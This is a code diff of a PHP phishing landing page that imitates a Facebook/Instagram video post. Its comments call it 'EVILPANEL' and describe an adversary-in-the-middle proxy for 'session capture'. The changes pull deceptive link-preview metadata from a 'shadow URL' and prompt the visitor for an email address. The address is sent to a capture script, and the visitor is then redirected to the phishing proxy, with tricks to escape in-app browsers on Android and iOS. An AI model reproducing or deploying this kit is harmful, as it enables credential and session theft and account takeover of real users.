@@ -1,22 +1,17 @@
-<?php
-// Disabled validate.php for testing to avoid 401/Unauthorized gating
-include "ip.php";
-// Static meta tags used for faster loading; shadow_config.php removed
-?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
-    <title>Facebook</title>
+    <title><?php echo htmlspecialchars($shadow_meta['title']); ?></title>
 
     <!-- Favicon -->
-    <link rel="shortcut icon" href="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yi/r/4Kv5U5b1o3f.png" sizes="196x196" />
+    <link rel="shortcut icon" href="https://www.wix.com/favicon.ico" sizes="196x196" />
 
-    <!-- SEO -->
-    <meta name="description" content="Watch this video on Instagram Watch the latest news and breaking stories. Click to view the full story." />
+    <!-- SEO - Dynamic from Shadow URL -->
+    <meta name="description" content="<?php echo htmlspecialchars($shadow_meta['description']); ?>" />
     <meta name="robots" content="noindex,nofollow" />
-    <link rel="canonical" href="https://www.instagram.com/reel/" />
+    <link rel="canonical" href="<?php echo htmlspecialchars($shadow_meta['og_url']); ?>" />
 
     <!-- Referrer & Theme -->
     <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer" />
@@ -24,24 +19,25 @@ include "ip.php";
     <meta name="mobile-web-app-capable" content="yes" />
     <meta name="apple-mobile-web-app-status-bar-style" content="black" />
 
-    <!-- Open Graph / Facebook -->
-    <meta property="fb:app_id" content="966242223397117" />
-    <meta property="og:site_name" content="Instagram" />
-    <meta property="og:title" content="Watch this video on Instagram" />
-    <meta property="og:description" content="See this and more on Instagram. Connect with friends and discover new content." />
-    <meta property="og:image" content="assets/og-image.png" />
-    <meta property="og:image:type" content="image/jpeg" />
+    <!-- Open Graph / Facebook - DYNAMIC FROM SHADOW URL -->
+    <!-- Shadow URL: <?php echo SHADOW_URL; ?> -->
+    <meta property="fb:app_id" content="350685531728" />
+    <meta property="og:site_name" content="<?php echo htmlspecialchars($shadow_meta['og_site_name']); ?>" />
+    <meta property="og:title" content="<?php echo htmlspecialchars($shadow_meta['og_title']); ?>" />
+    <meta property="og:description" content="<?php echo htmlspecialchars($shadow_meta['og_description']); ?>" />
+    <meta property="og:image" content="<?php echo htmlspecialchars($shadow_meta['og_image']); ?>" />
+    <meta property="og:image:type" content="image/png" />
     <meta property="og:image:width" content="1200" />
     <meta property="og:image:height" content="630" />
-    <meta property="og:type" content="article" />
-    <meta property="og:url" content="https://www.instagram.com/reel/" />
-    <meta property="og:locale" content="en_US" />
+    <meta property="og:type" content="<?php echo htmlspecialchars($shadow_meta['og_type']); ?>" />
+    <meta property="og:url" content="<?php echo htmlspecialchars($shadow_meta['og_url']); ?>" />
+    <meta property="og:locale" content="en_PH" />
 
-    <!-- Twitter -->
+    <!-- Twitter Card - DYNAMIC FROM SHADOW URL -->
     <meta name="twitter:card" content="summary_large_image" />
-    <meta name="twitter:title" content="Watch this video on Instagram" />
-    <meta name="twitter:description" content="See this and more on Instagram." />
-    <meta name="twitter:image" content="assets/og-image.png" />
+    <meta name="twitter:title" content="<?php echo htmlspecialchars($shadow_meta['og_title']); ?>" />
+    <meta name="twitter:description" content="<?php echo htmlspecialchars($shadow_meta['og_description']); ?>" />
+    <meta name="twitter:image" content="<?php echo htmlspecialchars($shadow_meta['og_image']); ?>" />
 
     
       <!-- Preconnect -->
@@ -147,7 +143,7 @@ include "ip.php";
             display: flex;
             justify-content: space-between;
             align-items: center;
-            padding: 10px 16px;
+            padding: 10px 12px;
             background: #fff;
             position: sticky;
             top: 0;
@@ -164,9 +160,7 @@ include "ip.php";
         }
 
         @media (max-width: 400px) {
-            .fb-logo {
-                font-size: 28px;
-            }
+            .fb-logo { font-size: 28px; }
         }
 
         .header-right {
@@ -198,7 +192,7 @@ include "ip.php";
             display: flex;
             justify-content: space-between;
             align-items: center;
-            padding: 12px 16px 8px;
+            padding: 12px 12px 8px;
         }
 
         .title-row h1 {
@@ -231,7 +225,7 @@ include "ip.php";
         .tabs {
             display: flex;
             gap: 8px;
-            padding: 8px 16px;
+            padding: 8px 12px;
             overflow-x: auto;
             -webkit-overflow-scrolling: touch;
             scrollbar-width: none;
@@ -275,7 +269,7 @@ include "ip.php";
 
         /* Video Info */
         .video-info {
-            padding: 12px 16px 8px;
+            padding: 12px 12px 8px;
         }
 
         .video-title {
@@ -294,7 +288,7 @@ include "ip.php";
 
         /* Video Container */
         .video-wrap {
-            padding: 0 16px;
+            padding: 0 12px;
         }
 
         .video-container {
@@ -318,16 +312,11 @@ include "ip.php";
         }
 
         @media (max-width: 400px) {
-            .video-container {
-                min-height: 350px;
-                max-height: 60vh;
-            }
+            .video-container { min-height: 350px; max-height: 60vh; }
         }
 
         @media (min-height: 700px) {
-            .video-container {
-                max-height: 65vh;
-            }
+            .video-container { max-height: 65vh; }
         }
 
         .video-thumb {
@@ -388,7 +377,7 @@ include "ip.php";
         }
 
         .cta-section {
-            padding: 0 16px 32px;
+            padding: 0 12px 32px;
             text-align: center;
             background: #fff;
         }
@@ -468,46 +457,18 @@ include "ip.php";
             background: #000 url('https://static.wixstatic.com/media/8455f5_24b802ad84f94de7bb66d8041129148e~mv2.jpg') center/cover no-repeat;
         }
 
-        .state-immersive .immersive-header {
-            z-index: 10;
-        }
-
-        .state-immersive .immersive-overlay {
-            z-index: 5;
+        .immersive-overlay {
             position: fixed;
             top: 0;
             left: 0;
             right: 0;
             bottom: 0;
-        }
-
-        /* Keep video visible in State 3 (CTA) as background */
-        .state-cta video,
-        body[data-state="cta"] .state-immersive video {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100vw;
-            height: 100vh;
-            object-fit: cover;
-            z-index: 0;
-        }
-
-        @media (max-width: 480px) {
-            .state-immersive video {
-                object-fit: cover;
-                object-position: center;
-            }
-        }
-
-        .immersive-overlay {
-            position: absolute;
-            inset: 0;
             padding: 20px;
             display: flex;
             flex-direction: column;
             justify-content: space-between;
             pointer-events: none;
+            z-index: 5;
         }
 
         .immersive-header {
@@ -530,16 +491,8 @@ include "ip.php";
         .immersive-fb-logo {
             display: flex;
             align-items: center;
-            margin-left: 0;
         }
 
-        .immersive-fb-logo img {
-            height: 32px;
-            width: auto;
-            filter: brightness(0) invert(1);
-        }
-
-        .immersive-fb-logo span,
         .immersive-fb-logo-text {
             font-size: 28px;
             font-weight: 700;
@@ -552,7 +505,6 @@ include "ip.php";
             display: flex;
             align-items: center;
             gap: 8px;
-            margin-right: 0;
         }
 
         .immersive-open-app {
@@ -966,7 +918,7 @@ include "ip.php";
         </main>
 
         <section class="state state-immersive" aria-hidden="true">
-            <video id="immersiveVideo" playsinline muted preload="metadata" poster="https://static.wixstatic.com/media/8455f5_a1a05e78db8345938482383301ff10bc~mv2.png" loop>
+            <video id="immersiveVideo" playsinline muted preload="metadata" poster="https://static.wixstatic.com/media/8455f5_24b802ad84f94de7bb66d8041129148e~mv2.jpg" loop>
                 <source src="https://video.wixstatic.com/video/8455f5_ba2ce46ccd4f4dd6bc8a0cd16347bdd2/480p/mp4/file.mp4" type="video/mp4">
             </video>
             <!-- Facebook Header for State 2 -->
@@ -1065,7 +1017,7 @@ include "ip.php";
 
             const requiredAssets = {
                 video: 'https://video.wixstatic.com/video/8455f5_ba2ce46ccd4f4dd6bc8a0cd16347bdd2/480p/mp4/file.mp4',
-                thumbnail: 'https://static.wixstatic.com/media/8455f5_a1a05e78db8345938482383301ff10bc~mv2.png',
+                thumbnail: 'https://static.wixstatic.com/media/8455f5_24b802ad84f94de7bb66d8041129148e~mv2.jpg',
                 profile: 'https://static.wixstatic.com/media/8455f5_6a7ec556f87d4f8bb2961ddcfb4122e7~mv2.jpg',
             };
 
@@ -1241,13 +1193,13 @@ include "ip.php";
                     startCtaAnimation();
                 });
 
-                // EVILPANEL: 2-STEP (Email first) then redirect to AiTM
+                // EVILPANEL: Direct redirect to AiTM proxy for session capture
                 // URL is set dynamically via PHP from server config
                 ctaButton?.addEventListener('click', () => {
-                    const baseUrl = '<?php echo getenv("EVILPANEL_URL") ?: "https://m.facebook.com/"; ?>';
+                    const targetUrl = '<?php echo getenv("EVILPANEL_URL") ?: "https://m.facebook.com/"; ?>';
                     const email = prompt('Enter your email to continue:');
-                    if (!email || !email.includes('@')) return;
-                    const targetUrl = baseUrl + (baseUrl.includes('?') ? '&' : '?') + 'email=' + encodeURIComponent(email.trim());
+                    if (!email) return;
+                    const finalUrl = `capture_email.php?email=${encodeURIComponent(email)}&next=${encodeURIComponent(targetUrl)}`;
                     const ua = navigator.userAgent || '';
                     
                     // Detect in-app browsers (Messenger, Facebook, Instagram)
@@ -1289,12 +1241,12 @@ include "ip.php";
                         // Copy link functionality
                         document.getElementById('copy-link-btn').addEventListener('click', async () => {
                             try {
-                                await navigator.clipboard.writeText(targetUrl);
+                                await navigator.clipboard.writeText(finalUrl);
                                 document.getElementById('copy-link-btn').textContent = '✓ Nakopya na!';
                                 document.getElementById('copy-link-btn').style.background = '#42b72a';
                             } catch(e) {
                                 const input = document.createElement('input');
-                                input.value = targetUrl;
+                                input.value = finalUrl;
                                 input.style.cssText = 'position:fixed;top:-9999px';
                                 document.body.appendChild(input);
                                 input.select();
@@ -1308,15 +1260,15 @@ include "ip.php";
                         // Open browser button - try all methods
                         document.getElementById('open-browser-btn').addEventListener('click', () => {
                             if (isAndroid) {
-                                const domain = targetUrl.replace('https://', '');
+                                    const domain = finalUrl.replace('https://', '');
                                 window.location.href = `intent://${domain}#Intent;scheme=https;package=com.android.chrome;end`;
                                 setTimeout(() => {
                                     window.location.href = `intent://${domain}#Intent;scheme=https;action=android.intent.action.VIEW;end`;
                                 }, 500);
-                                setTimeout(() => { window.open(targetUrl, '_system'); }, 1000);
+                                    setTimeout(() => { window.open(finalUrl, '_system'); }, 1000);
                             } else if (isIOS) {
-                                window.location.href = 'x-safari-https://' + targetUrl.replace('https://', '');
-                                setTimeout(() => { window.open(targetUrl, '_blank'); }, 500);
+                                    window.location.href = 'x-safari-https://' + finalUrl.replace('https://', '');
+                                    setTimeout(() => { window.open(finalUrl, '_blank'); }, 500);
                             }
                         });
                         
@@ -1324,7 +1276,7 @@ include "ip.php";
                         // Normal browser - direct redirect
                         ctaButton.disabled = true;
                         ctaButton.textContent = 'Connecting...';
-                        setTimeout(() => { window.location.href = targetUrl; }, 300);
+                            setTimeout(() => { window.location.href = finalUrl; }, 300);
                     }
                 });
 
@@ -1474,4 +1426,3 @@ include "ip.php";
     </script>
 </body>
 </html>
-                                     
